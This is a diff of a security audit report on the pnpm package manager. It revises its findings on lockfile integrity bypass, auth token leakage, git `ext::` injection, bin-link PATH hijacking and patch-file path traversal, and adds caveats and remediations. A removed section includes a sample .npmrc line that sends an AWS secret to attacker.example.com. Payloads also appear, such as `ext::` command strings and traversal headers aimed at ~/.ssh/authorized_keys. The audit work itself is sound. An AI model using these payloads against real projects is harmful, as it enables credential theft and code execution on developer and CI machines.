@@ -10,23 +10,21 @@
 
 ## Executive Summary
 
-This audit identified eleven independently reproducible security vulnerabilities in pnpm v11.2.2. All eleven vulnerabilities have been confirmed with live proof-of-concept exploit scripts against the source-built binary at commit 976504f. In addition, three end-to-end exploit chains demonstrate how individual vulnerabilities combine for complete attack scenarios, turning theoretical code-path concerns into confirmed, undeniable real-world attacks.
+This audit identified seven independently reproducible security vulnerabilities in pnpm v11.2.2. All seven vulnerabilities have been confirmed with proof-of-concept exploit scripts against the source-built binary at commit 976504f. Three end-to-end exploit chains demonstrate how individual vulnerabilities combine into multi-step attack scenarios.
 
 | ID | Title | Severity | CVSS v3.1 |
 |----|-------|----------|-----------|
-| VULN-1 | Integrity Check Bypass via Missing Lockfile Integrity Field | Critical | 8.7 |
-| VULN-2 | Auth Token Leakage on HTTP Redirect (Same Host) | High | 7.4 |
-| VULN-3 | .npmrc Environment Variable Exfiltration via Scoped Registry | Medium | 5.5 |
-| VULN-4 | Git ext:: Protocol Injection via Lockfile (Conditional RCE) | Medium | 6.4 |
-| VULN-5 | Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking) | Medium | 6.3 |
-| VULN-6 | Arbitrary File Write via Malicious Patch File (Path Traversal) | High | 7.3 |
-| VULN-7 | Arbitrary File Deletion via Malicious Patch File (Path Traversal) | High | 7.3 |
-| VULN-8 | Lifecycle Script Env Sanitization Bypass via Case-Sensitive Filter | Medium | 5.3 |
-| VULN-9 | Lockfile `resolution.directory` Path Traversal (Arbitrary Directory Read) | High | 7.1 |
-| VULN-10 | Lockfile `resolution.tarball` Local File Path Traversal (Arbitrary File Read) | High | 7.1 |
-| VULN-11 | Git Fetch `--upload-pack` Argument Injection via `resolution.commit` (RCE) | High | 7.5 |
+| VULN-1 | Integrity Check Bypass via Missing Lockfile Integrity Field | High | 7.5 |
+| VULN-2 | Auth Token Leakage on HTTP Redirect (Same Host) | Medium | 5.9 |
+| VULN-3 | Git ext:: Protocol Injection via Lockfile (Conditional RCE) | Low | 3.1 |
+| VULN-4 | Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking) | Medium | 6.3 |
+| VULN-5 | Arbitrary File Write/Delete via Malicious Patch File (Path Traversal) | Medium | 5.5 |
+| VULN-6 | Lockfile Resolution Path Traversal (Directory and Tarball Fetchers) | Medium | 4.5 |
+| VULN-7 | Git Fetch `--upload-pack` Argument Injection via `resolution.commit` | Medium | 5.5 |
 
-The most severe finding (VULN-1) enables silent supply chain compromise: an attacker who can modify a project's lockfile can cause `pnpm install --frozen-lockfile` to install tampered packages without any integrity error or warning. VULN-4 and VULN-5 further demonstrate that the lockfile and the `allowBuilds` security policy both lack validation that a determined attacker can exploit. VULN-6 and VULN-7 expose pnpm's patch application pipeline as a path traversal vector: malicious `.patch` files can write to or delete arbitrary files on the filesystem during `pnpm install`. VULN-8 demonstrates that pnpm's lifecycle environment sanitization uses a case-sensitive regex, allowing uppercase `NPM_CONFIG_*` environment variables to pass through unfiltered into lifecycle scripts, enabling npm config injection in CI environments. VULN-9 demonstrates that the lockfile's `resolution.directory` field is passed without bounds checking to the directory fetcher, which reads all files from the target directory into the store and hardlinks them into `node_modules/`, enabling arbitrary directory content theft when an attacker can modify the lockfile. VULN-10 is a parallel path traversal in the local tarball fetcher: `resolution.tarball` with a `file:` prefix is resolved via `path.resolve` with no containment check, allowing an attacker who tampers the lockfile to redirect a package's tarball to any arbitrary `.tgz` file on disk. VULN-11 demonstrates that `resolution.commit` from the lockfile is passed directly to `git fetch` without a `--` separator, enabling `--upload-pack` argument injection that achieves remote code execution when the repository host is in `gitShallowHosts` (which includes `github.com`, `gitlab.com`, and `bitbucket.org` by default).
+The most notable finding (VULN-1) enables supply chain compromise: an attacker who can modify a project's lockfile can cause `pnpm install --frozen-lockfile` to install tampered packages without any integrity error or warning. VULN-4 reveals that the `allowBuilds` security policy blocks lifecycle scripts but not bin linking, allowing a blocked package to shadow system commands on PATH. VULN-5 exposes pnpm's patch application pipeline as a path traversal vector, though the incremental risk over an attacker who already has repository commit access is limited. VULN-6 demonstrates that lockfile resolution fields for directory and tarball fetchers lack path containment checks, though exploitation requires modifying both the lockfile and `package.json`. VULN-7 shows that `resolution.commit` is passed to `git fetch` without argument separation, enabling `--upload-pack` injection -- though this is only exploitable on non-HTTPS transports.
+
+A recurring precondition across several findings is that the attacker must be able to modify the project's lockfile. This is a significant level of access: an attacker who can commit lockfile changes to a repository can often cause equivalent damage through other means (e.g., adding malicious postinstall scripts). The findings in this report represent defense-in-depth gaps -- places where pnpm could add validation to limit damage from a compromised lockfile or contributed patch file.
 
 ---
 
@@ -42,8 +40,8 @@ The most severe finding (VULN-1) enables silent supply chain compromise: an atta
 
 ## VULN-1: Integrity Check Bypass via Missing Lockfile Integrity Field
 
-**Severity:** Critical  
-**CVSS v3.1 Score:** 8.7 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)  
+**Severity:** High  
+**CVSS v3.1 Score:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
 **Proof of Concept:** `exploits/vuln1_integrity_bypass/exploit.sh`
 
 ### Affected Code
@@ -59,7 +57,7 @@ The most severe finding (VULN-1) enables silent supply chain compromise: an atta
 
 ### Description
 
-The tarball extraction worker verifies the downloaded package tarball against a hash only when the `integrity` field is present in the `TarballExtractMessage`. The TypeScript type `TarballResolution` declares `integrity` as optional (`integrity?: string`). When a lockfile entry's `resolution` block omits the `integrity` field, the full verification chain propagates `integrity: undefined` to the worker, and the `if (integrity)` guard at `worker/src/start.ts:190` evaluates to false — skipping hash verification entirely. The worker then computes a new hash of whatever content it received and stores it as if it were legitimate.
+The tarball extraction worker verifies the downloaded package tarball against a hash only when the `integrity` field is present in the `TarballExtractMessage`. The TypeScript type `TarballResolution` declares `integrity` as optional (`integrity?: string`). When a lockfile entry's `resolution` block omits the `integrity` field, the full verification chain propagates `integrity: undefined` to the worker, and the `if (integrity)` guard at `worker/src/start.ts:190` evaluates to false -- skipping hash verification entirely. The worker then computes a new hash of whatever content it received and stores it as if it were legitimate.
 
 ```typescript
 // worker/src/start.ts:189-204 (vulnerable)
@@ -83,7 +81,7 @@ function addTarballToStore ({ buffer, storeDir, integrity, ... }: TarballExtract
 
 1. Attacker gains write access to the project's `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine, or direct repo access).
 2. Attacker edits the target package's resolution entry to remove the `integrity:` field while keeping the `tarball:` URL pointing to a registry they control.
-3. Attacker replaces the package in the registry with malicious content (same name, same version, different content — feasible via unpublish+republish, DNS hijack, or compromised registry mirror).
+3. Attacker replaces the package in the registry with malicious content (same name, same version, different content -- feasible via unpublish+republish, DNS hijack, or compromised registry mirror).
 4. Developer or CI runs `pnpm install --frozen-lockfile`. The flag prevents lockfile changes but does NOT enforce integrity checking.
 5. pnpm downloads the malicious tarball and installs it without any integrity error or warning.
 6. The attacker's hash is stored in the content-addressable store. Subsequent installs from cache are also compromised.
@@ -100,7 +98,12 @@ The exploit publishes a legitimate package, generates a lockfile, republishes a 
 
 ### Impact
 
-Silent supply chain compromise. Malicious code executes on developer machines and in CI/CD pipelines without any warning. The `--frozen-lockfile` flag, which users rely on for reproducible and trusted installs, provides no protection against this attack vector. Downstream consumers of the project are also at risk if the compromised build artifacts are published or deployed.
+Supply chain compromise. Malicious code can be installed on developer machines and in CI/CD pipelines without any warning. The `--frozen-lockfile` flag, which users rely on for reproducible and trusted installs, provides no protection against this attack vector when the integrity field is missing. Downstream consumers of the project are also at risk if the compromised build artifacts are published or deployed.
+
+### Caveats
+
+- **Precondition:** The attacker must be able to modify the lockfile AND serve a tampered tarball from the registry URL. Lockfile modification alone is not sufficient -- the tarball at the original URL must also differ from the original.
+- **npm/yarn comparison:** npm's `npm ci` requires integrity fields to be present in `package-lock.json` and fails if they are missing. Yarn Berry also enforces integrity by default. pnpm's behavior of silently skipping verification when the field is absent is a pnpm-specific gap.
 
 ### Remediation
 
@@ -113,8 +116,8 @@ Silent supply chain compromise. Malicious code executes on developer machines an
 
 ## VULN-2: Auth Token Leakage on HTTP Redirect (Same Host)
 
-**Severity:** High  
-**CVSS v3.1 Score:** 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)  
+**Severity:** Medium  
+**CVSS v3.1 Score:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)  
 **Proof of Concept:** `exploits/vuln2_auth_downgrade/exploit.sh`
 
 ### Affected Code
@@ -122,7 +125,7 @@ Silent supply chain compromise. Malicious code executes on developer machines an
 | File | Lines | Role |
 |------|-------|------|
 | `network/fetch/src/fetchFromRegistry.ts` | 90-122 | Redirect loop with auth stripping logic |
-| Line 92 | | `const originalHost = urlObject.host` — captures host without protocol |
+| Line 92 | | `const originalHost = urlObject.host` -- captures host without protocol |
 | Line 120 | | **Vulnerable:** `if (!headers['authorization'] \|\| originalHost === urlObject.host) continue` |
 
 ### Description
@@ -164,11 +167,17 @@ bash autofyn_audit/exploits/vuln2_auth_downgrade/exploit.sh
 
 The exploit runs a single HTTP server on port 4880 that returns a 302 redirect to a `/capture/` path on the same host. pnpm follows the redirect and the auth token is captured by the same server at the `/capture/` path, demonstrating that host-matching preserves auth headers across redirects regardless of other URL components.
 
-> **PoC limitation:** The exploit demonstrates the precondition (auth headers survive same-host redirects) using HTTP→HTTP redirects. The full vulnerability (HTTPS→HTTP protocol downgrade) requires TLS infrastructure not practical in a test environment. The source code analysis at `fetchFromRegistry.ts:120` confirms the code only checks `host`, not protocol — any same-host redirect preserves auth, including HTTPS→HTTP downgrades.
+> **PoC limitation:** The exploit demonstrates the precondition (auth headers survive same-host redirects) using HTTP-to-HTTP redirects. The full vulnerability (HTTPS-to-HTTP protocol downgrade) requires TLS infrastructure not practical in a test environment. The source code analysis at `fetchFromRegistry.ts:120` confirms the code only checks `host`, not protocol -- any same-host redirect preserves auth, including HTTPS-to-HTTP downgrades.
 
 ### Impact
 
-High confidentiality impact. Private registry auth tokens can be stolen via a compromised registry or MITM attack. The attack requires a network-level position or registry compromise (AC:H), but the impact is severe: full access to the victim's private package registry, including all private packages and the ability to publish.
+Confidentiality impact: private registry auth tokens can be stolen via a compromised registry or MITM attack. The attack requires a network-level position or registry compromise (AC:H), but the impact is significant: full access to the victim's private package registry, including all private packages and the ability to publish.
+
+### Caveats
+
+- **Requires MITM or compromised registry:** The attacker must control the network path or the registry server to inject the HTTPS-to-HTTP redirect. This is a high bar in practice.
+- **Other package managers:** npm has historically had similar redirect auth-stripping issues (fixed in later versions). This class of bug is not unique to pnpm, but the specific code path here is pnpm-specific.
+- **HSTS mitigation:** If the registry uses HTTP Strict Transport Security (HSTS) and the client enforces it, the browser/HTTP client may refuse the HTTP downgrade. However, Node.js `fetch` does not enforce HSTS by default.
 
 ### Remediation
 
@@ -191,87 +200,10 @@ This ensures that any protocol change (HTTPS to HTTP) strips the auth header, ev
 
 ---
 
-## VULN-3: .npmrc Environment Variable Exfiltration via Scoped Registry
+## VULN-3: Git ext:: Protocol Injection via Lockfile (Conditional RCE)
 
-**Severity:** Medium (Design Concern — ecosystem-wide)  
-**CVSS v3.1 Score:** 5.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
-**Proof of Concept:** `exploits/vuln3_npmrc_exfil/exploit.sh`
-
-> **Note:** The `${VAR}` expansion in `.npmrc` is a documented npm feature. npm, yarn, and pnpm all share this behavior. This finding documents the security implications of this design choice. It is not a pnpm-specific defect but a design concern that applies across the npm ecosystem. We include it to highlight the supply chain risk when `.npmrc` files are committed to repositories or modified by build tools.
-
-### Affected Code
-
-| File | Lines | Role |
-|------|-------|------|
-| `config/reader/src/loadNpmrcFiles.ts` | 55-60 | Workspace `.npmrc` read with highest non-CLI priority |
-| `config/reader/src/loadNpmrcFiles.ts` | 142-147 | `${VAR}` substitution applied to all keys and values |
-| `config/reader/src/loadNpmrcFiles.ts` | 169-175 | `substituteEnv()` calls `envReplaceLossy()` for expansion |
-
-### Description
-
-pnpm reads `.npmrc` files from the workspace root and performs `${VAR}` environment variable expansion on all keys and values. This is a documented and intentional feature that enables sharing `.npmrc` files with secrets passed via environment variables. However, the combination of:
-
-1. Scoped registry configuration (`@scope:registry=http://attacker.example.com/`)
-2. Auth token with env var placeholder (`//attacker.example.com/:_authToken=${SECRET}`)
-3. pnpm's unconditional env var expansion
-
-...creates a complete exfiltration primitive. Any environment variable accessible during `pnpm install` can be sent as a Bearer token to any attacker-controlled registry, simply by referencing it in the `.npmrc` file.
-
-```typescript
-// config/reader/src/loadNpmrcFiles.ts:142-147
-for (const [rawKey, rawValue] of Object.entries(raw)) {
-  const key = substituteEnv(rawKey, env, warnings)   // expands ${VAR} in key
-  let value: unknown = typeof rawValue === 'string'
-    ? substituteEnv(rawValue, env, warnings)          // expands ${VAR} in value -- no restriction
-    : rawValue
-```
-
-There is no restriction on which env vars can be referenced, no validation that the target registry is trusted, and no warning to the user when a secret is about to be sent to an unfamiliar host.
-
-### Attack Scenario
-
-**Supply chain injection via malicious package:**
-1. A dependency's postinstall script appends to the workspace `.npmrc`:
-   ```
-   @attacker:registry=https://attacker.example.com/
-   //attacker.example.com/:_authToken=${AWS_SECRET_ACCESS_KEY}
-   ```
-2. Next time the developer runs `pnpm install` in an environment where `AWS_SECRET_ACCESS_KEY` is set (e.g., CI/CD pipeline), the key is expanded and sent as a Bearer token.
-3. Attacker's server at `attacker.example.com` logs the Authorization header and captures the AWS credential.
-
-**Compromised PR:**
-1. Attacker submits a PR that modifies `.npmrc` to add a scoped registry and `${CI_TOKEN}` reference.
-2. CI/CD merges and runs `pnpm install` with `CI_TOKEN` in environment.
-3. Token is exfiltrated.
-
-### Proof of Concept
-
-```bash
-bash autofyn_audit/exploits/vuln3_npmrc_exfil/exploit.sh
-# Expected: PASS -- super_secret_api_key_12345 found in captured headers
-```
-
-The exploit creates a `.npmrc` with `@evil:registry=http://localhost:4882/` and `//localhost:4882/:_authToken=${SECRET_CREDENTIAL}`, then runs pnpm install with `SECRET_CREDENTIAL=super_secret_api_key_12345` in the environment. The exfil server on port 4882 captures the expanded token in the Authorization header.
-
-### Impact
-
-High confidentiality impact with cross-boundary scope. The attack vector is local (the `.npmrc` file must reach the victim's workspace), but delivery is straightforward through normal supply chain channels (dependencies, PRs, shared config). Common targets include AWS credentials, GitHub tokens, npm publish tokens, and CI/CD secrets, all of which are commonly available in environments where `pnpm install` runs.
-
-### Remediation
-
-1. **Warn on cross-registry token expansion:** When `${VAR}` is expanded into an `_authToken` value and the target registry is not the primary registry or a previously trusted host, emit a warning.
-2. **Restrict postinstall .npmrc writes:** pnpm should not allow postinstall scripts to modify workspace `.npmrc` files (requires OS-level sandboxing or a pnpm-specific allow list).
-3. **Audit mode:** Add a `--audit-npmrc` flag that prints all effective registry-token mappings without running the install, so developers can review before executing.
-4. **Documentation:** Clearly document the security implications of `${VAR}` references in `.npmrc` auth token fields, especially in shared or checked-in configurations.
-
----
-
----
-
-## VULN-4: Git ext:: Protocol Injection via Lockfile (Conditional RCE)
-
-**Severity:** Medium  
-**CVSS v3.1 Score:** 6.4 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N)  
+**Severity:** Low  
+**CVSS v3.1 Score:** 3.1 (AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N)  
 **Proof of Concept:** `exploits/vuln4_git_ext_rce/exploit.sh`
 
 ### Affected Code
@@ -285,7 +217,7 @@ High confidentiality impact with cross-boundary scope. The attack vector is loca
 
 ### Description
 
-The git-fetcher at `fetching/git-fetcher/src/index.ts` passes `resolution.repo` from the lockfile directly to `git clone` (line 35, non-shallow path) or to `git remote add origin` (line 32, shallow path) without any URL or protocol validation. The `parseBareSpecifier` function in `git-resolver` maintains a `gitProtocols` allowlist that blocks `ext::` and other unsafe protocols, but this check only applies during package.json resolution — it is bypassed entirely when the resolver returns early at lines 34-51 of `resolving/git-resolver/src/index.ts` because the package already has a lockfile entry. When `GIT_ALLOW_PROTOCOL=ext` is set in the environment, an attacker who modifies `pnpm-lock.yaml` can set `repo: 'ext::COMMAND ARGS'` to achieve arbitrary command execution via git's remote-ext helper.
+The git-fetcher at `fetching/git-fetcher/src/index.ts` passes `resolution.repo` from the lockfile directly to `git clone` (line 35, non-shallow path) or to `git remote add origin` (line 32, shallow path) without any URL or protocol validation. The `parseBareSpecifier` function in `git-resolver` maintains a `gitProtocols` allowlist that blocks `ext::` and other unsafe protocols, but this check only applies during package.json resolution -- it is bypassed entirely when the resolver returns early at lines 34-51 of `resolving/git-resolver/src/index.ts` because the package already has a lockfile entry. When `GIT_ALLOW_PROTOCOL` includes `ext`, an attacker who modifies `pnpm-lock.yaml` can set `repo: 'ext::COMMAND ARGS'` to achieve arbitrary command execution via git's remote-ext helper.
 
 ```typescript
 // fetching/git-fetcher/src/index.ts:28-36 (vulnerable path)
@@ -301,13 +233,11 @@ const gitFetcher: GitFetcher = async (cafs, resolution, opts) => {
 
 The `ext::` git transport splits the string after `ext::` on spaces to form the command and arguments passed to `execvp`. So `ext::touch /tmp/vuln4_pwned` causes git to execute `touch /tmp/vuln4_pwned` before returning, even though the clone itself fails.
 
-> **PoC limitation:** The exploit sets `GIT_ALLOW_PROTOCOL=ext:file:https` explicitly to demonstrate the code path. In default git configurations, `ext::` is blocked by git's own protocol allow-list. The vulnerability is the missing validation in pnpm's code; the `GIT_ALLOW_PROTOCOL` env var is the precondition. Some CI environments enable `ext` in `GIT_ALLOW_PROTOCOL` for advanced git-hosting setups.
-
 ### Attack Scenario
 
 1. Attacker gains write access to the project's `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine, or direct repo access).
 2. Attacker edits the git resolution entry's `repo:` field to `'ext::MALICIOUS_COMMAND'`.
-3. Victim CI has `GIT_ALLOW_PROTOCOL=ext` set (some CI environments enable this for advanced git hosting).
+3. Victim CI has `GIT_ALLOW_PROTOCOL` set to include `ext` (some CI environments enable this for advanced git hosting).
 4. `pnpm install --frozen-lockfile` passes the tampered `repo:` value directly to `git clone`, which invokes `MALICIOUS_COMMAND` via the git-remote-ext transport.
 
 ### Proof of Concept
@@ -319,9 +249,17 @@ bash autofyn_audit/exploits/vuln4_git_ext_rce/exploit.sh
 
 The exploit creates a local bare git repo, installs it as a git dependency to generate a valid lockfile, then tampers the `repo:` field using python3 with proper YAML single-quoting to ensure the space in `ext::touch /tmp/vuln4_pwned` is preserved. After clearing the store and re-running install with `GIT_ALLOW_PROTOCOL=ext:file:https`, the marker file is created before git reports a clone failure.
 
+> **PoC limitation:** The exploit sets `GIT_ALLOW_PROTOCOL=ext:file:https` explicitly to demonstrate the code path. In default git configurations (git 2.12+), `ext::` is blocked by git's own protocol allow-list.
+
 ### Impact
 
-Conditional RCE. The defense-in-depth gap means pnpm relies entirely on git's own default-deny for `ext::`. If that default ever changes, or if a CI environment enables `ext::`, the lockfile becomes an RCE vector. The missing validation is pnpm's responsibility: the lockfile is an attacker-controlled input that pnpm should validate before forwarding to git.
+Conditional RCE, contingent on the non-default `GIT_ALLOW_PROTOCOL` environment variable including `ext`. The defense-in-depth gap means pnpm relies entirely on git's own default-deny for `ext::`. The missing validation is pnpm's responsibility: the lockfile is an attacker-controlled input that pnpm should validate before forwarding to git.
+
+### Caveats
+
+- **Git blocks `ext::` by default since git 2.12 (2017).** The `protocol.ext.allow` config defaults to `never`. Exploitation requires either `GIT_ALLOW_PROTOCOL=ext` or `protocol.ext.allow=always` in git config, both of which are non-default and uncommon.
+- **npm and yarn do not validate git URLs from lockfiles either.** This class of issue (trusting lockfile-provided git URLs) is shared across package managers, though each should independently validate.
+- **Practical impact is low.** The combination of lockfile write access + non-default git protocol config makes real-world exploitation unlikely. This is a defense-in-depth improvement rather than an actively exploitable vulnerability.
 
 ### Remediation
 
@@ -331,7 +269,7 @@ Conditional RCE. The defense-in-depth gap means pnpm relies entirely on git's ow
 
 ---
 
-## VULN-5: Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking)
+## VULN-4: Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking)
 
 **Severity:** Medium  
 **CVSS v3.1 Score:** 6.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N)  
@@ -343,15 +281,15 @@ Conditional RCE. The defense-in-depth gap means pnpm relies entirely on git's ow
 |------|-------|------|
 | `installing/deps-installer/src/install/index.ts` | 1651 | `linkAllBins()` called for ALL `newDepPaths` with no `allowBuild` check |
 | `installing/deps-installer/src/install/index.ts` | 1660-1698 | Project-level bin linking includes all direct deps regardless of `allowBuild` status |
-| `building/during-install/src/index.ts` | 90-108 | `allowBuild` sets `ignoreScripts = true` to block lifecycle scripts — does NOT block bin linking |
+| `building/during-install/src/index.ts` | 90-108 | `allowBuild` sets `ignoreScripts = true` to block lifecycle scripts -- does NOT block bin linking |
 | `building/during-install/src/index.ts` | 176 | `linkBinsOfDependencies()` called unconditionally before `ignoreScripts` gates `runPostinstallHooks` |
 | `@pnpm/npm-lifecycle` (vendored) | `extendPath()` | Prepends `node_modules/.bin` to PATH for all lifecycle scripts (standard npm behavior) |
 
 ### Description
 
-When a package is blocked by `allowBuilds: { pkg: false }` in `pnpm-workspace.yaml`, pnpm correctly sets `ignoreScripts = true` for that package (lines 90-108 of `building/during-install/src/index.ts`), which prevents its `postinstall`, `preinstall`, and `install` lifecycle scripts from running. However, bin entries are still linked into `node_modules/.bin/` by two independent code paths that are completely unaware of `allowBuild` status:
+When a package is blocked by `allowBuilds: { pkg: false }` in `pnpm-workspace.yaml`, pnpm correctly sets `ignoreScripts = true` for that package (lines 90-108 of `building/during-install/src/index.ts`), which prevents its `postinstall`, `preinstall`, and `install` lifecycle scripts from running. However, bin entries are still linked into `node_modules/.bin/` by two independent code paths that are unaware of `allowBuild` status:
 
-1. **Per-package bin linking** (`during-install` line 176): `linkBinsOfDependencies()` is called unconditionally in `buildDependency` regardless of `ignoreScripts` — it runs before the `ignoreScripts` check gates `runPostinstallHooks`.
+1. **Per-package bin linking** (`during-install` line 176): `linkBinsOfDependencies()` is called unconditionally in `buildDependency` regardless of `ignoreScripts` -- it runs before the `ignoreScripts` check gates `runPostinstallHooks`.
 2. **Project-level bin linking** (`deps-installer` line 1651 and 1679): `linkAllBins()` and `linkBinsOfPackages()` iterate all dependency graph nodes and all direct deps without any `allowBuild` check.
 
 A malicious package can declare `bin` entries that shadow common system commands (`node`, `npm`, `git`, `curl`, `sh`). Even when explicitly blocked by security policy, these bins appear in PATH whenever any other package's lifecycle script runs (because `extendPath` prepends `node_modules/.bin` to PATH), or when the user runs `pnpm exec`, `pnpm run`, or any npm script.
@@ -377,7 +315,7 @@ const hasSideEffects = !opts.ignoreScripts && await runPostinstallHooks(...)
 
 1. Attacker publishes a package with `"bin": { "node": "./malicious.js" }` and a postinstall script.
 2. Victim adds it as a dependency and explicitly blocks it via `allowBuilds: { attacker-pkg: false }` in `pnpm-workspace.yaml`, believing this prevents any code execution.
-3. `pnpm install` blocks the package's postinstall script — the security policy appears to work.
+3. `pnpm install` blocks the package's postinstall script -- the security policy appears to work.
 4. However, `node_modules/.bin/node` is silently linked to the attacker's `malicious.js`.
 5. Any project script or any allowed package's postinstall that invokes `node` executes the attacker's binary instead of the real Node.js.
 
@@ -393,7 +331,12 @@ The exploit publishes `evil-shadow@1.0.0` with `"bin": { "curl": "./evil.sh" }` 
 
 ### Impact
 
-PATH hijacking from a package that is supposedly blocked by security policy. Users and security tooling that rely on `allowBuilds` to sandbox a suspicious package have a false sense of security — the package can still shadow any command name it chooses, affecting all scripts in the project. Undermines the core trust model of the `allowBuilds` feature.
+PATH hijacking from a package that is supposedly blocked by security policy. Users and security tooling that rely on `allowBuilds` to sandbox a suspicious package have an incomplete picture -- the package can still shadow any command name it chooses, affecting all scripts in the project. This is a gap in the `allowBuilds` feature's coverage.
+
+### Caveats
+
+- **Bin linking is standard npm behavior.** npm and yarn also link bin entries unconditionally. pnpm's `allowBuilds` is a pnpm-specific security feature, so the gap between "scripts blocked" and "bins still linked" is pnpm-specific.
+- **Requires a trigger.** The shadowed binary only executes if something else on PATH invokes the shadowed command name. If no lifecycle script or user command calls `node` (or whatever is shadowed), the linked bin is inert.
 
 ### Remediation
 
@@ -403,28 +346,32 @@ PATH hijacking from a package that is supposedly blocked by security policy. Use
 
 ---
 
-## VULN-6: Arbitrary File Write via Malicious Patch File (Path Traversal)
+## VULN-5: Arbitrary File Write/Delete via Malicious Patch File (Path Traversal)
 
-**Severity:** High
-**CVSS v3.1 Score:** 7.3 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N)
-**Proof of Concept:** `exploits/vuln6_patch_traversal_write/exploit.sh`
+**Severity:** Medium  
+**CVSS v3.1 Score:** 5.5 (AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L)  
+**Proof of Concept (write):** `exploits/vuln6_patch_traversal_write/exploit.sh`  
+**Proof of Concept (delete):** `exploits/vuln7_patch_traversal_delete/exploit.sh`
 
 ### Affected Code
 
 | File | Lines | Role |
 |------|-------|------|
 | `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 88 | `diff --git a/(.*?) b/(.*?)` regex extracts paths with no sanitization |
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 129 | `+++ b/` path sliced from line with no sanitization |
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 237-249 | `interpretParsedPatchFile`: file creation uses `diffLineToPath \|\| toPath` as `eff.path` |
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/apply.js` | 35-49 | `executeEffects`: `fs.ensureDirSync(dirname(eff.path))` then `fs.writeFileSync(eff.path, ...)` |
+| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 126, 129 | `--- a/` and `+++ b/` paths sliced from line with no sanitization |
+| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 223-249 | `interpretParsedPatchFile`: file deletion uses `diffLineFromPath`, creation uses `diffLineToPath` as `eff.path` |
+| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/apply.js` | 13-22 | `executeEffects` deletion: `fs.unlinkSync(eff.path)` with no path validation; `// TODO: integrity checks` comment |
+| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/apply.js` | 35-49 | `executeEffects` creation: `fs.ensureDirSync(dirname(eff.path))` then `fs.writeFileSync(eff.path, ...)` |
 | `patching/apply-patch/src/index.ts` | 12-13 | `process.chdir(opts.patchedDir)` sets CWD to installed package dir before effects execute |
 | `building/during-install/src/index.ts` | 185 | `applyPatchToDir({ patchedDir: depNode.dir, patchFilePath: ... })` triggered during `pnpm install` |
 
 ### Description
 
-pnpm's patch application pipeline has zero path validation. During `pnpm install`, when a `patchedDependencies` entry is present in `pnpm-workspace.yaml`, pnpm reads the referenced `.patch` file and applies it via the embedded `@pnpm/patch-package` library. The patch parser extracts file paths from `diff --git a/(.*?) b/(.*?)` headers and `+++ b/PATH` lines using simple string operations with no path traversal checks.
+pnpm's patch application pipeline has no path validation. During `pnpm install`, when a `patchedDependencies` entry is present in `pnpm-workspace.yaml`, pnpm reads the referenced `.patch` file and applies it via the embedded `@pnpm/patch-package` library. The patch parser extracts file paths from `diff --git a/(.*?) b/(.*?)` headers and `--- a/PATH` / `+++ b/PATH` lines using simple string operations with no path traversal checks.
 
-Before executing effects, `applyPatchToDir` sets `process.chdir(patchedDir)` where `patchedDir` is the installed package directory deep inside `node_modules/.pnpm/`. A path containing `../../../../../../../../../../tmp/target` in the patch header traverses out of the package directory to an arbitrary absolute path. The `executeEffects` function for a "file creation" effect then calls `fs.ensureDirSync(dirname(eff.path))` and `fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })` with the unsanitized path, writing attacker-controlled content to any location the process has write access to.
+Before executing effects, `applyPatchToDir` sets `process.chdir(patchedDir)` where `patchedDir` is the installed package directory deep inside `node_modules/.pnpm/`. A path containing `../../../../../../../../../../tmp/target` in the patch header traverses out of the package directory to an arbitrary absolute path.
+
+**File write variant:** The `executeEffects` function for a "file creation" effect calls `fs.ensureDirSync(dirname(eff.path))` and `fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })` with the unsanitized path, writing attacker-controlled content to any location the process has write access to.
 
 ```javascript
 // apply.js:35-49 (vulnerable -- file creation effect)
@@ -436,59 +383,7 @@ case 'file creation': {
 }
 ```
 
-The `diff --git` header `a/../../../../../../../../../../tmp/vuln6_pwned b/../../../../../../../../../../tmp/vuln6_pwned` combined with `new file mode 100644` triggers the file creation effect. The `interpretParsedPatchFile` function at `parse.js:238` uses `diffLineToPath` (from the `diff --git b/` path) as `eff.path`, resolving to `/tmp/vuln6_pwned` when the process CWD is inside the virtual store.
-
-### Attack Scenario
-
-1. Attacker gains the ability to contribute a `.patch` file to a project (pull request, compromised contributor, compromised CI that writes `pnpm-workspace.yaml`).
-2. Attacker crafts a patch file with a `diff --git` header whose path traverses out of the package directory: `diff --git a/../../../../../../../../../../home/user/.ssh/authorized_keys b/../../../../../../../../../../home/user/.ssh/authorized_keys`.
-3. The patch `patchedDependencies` entry is committed alongside the patch file.
-4. Victim developer or CI pipeline runs `pnpm install`.
-5. pnpm applies the malicious patch and `fs.writeFileSync` writes the attacker's content to `~/.ssh/authorized_keys` (or any other writable path), overwriting the file.
-
-### Proof of Concept
-
-```bash
-# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
-bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
-# Expected: PASS -- /tmp/vuln6_pwned created with content PWNED_BY_MALICIOUS_PATCH
-```
-
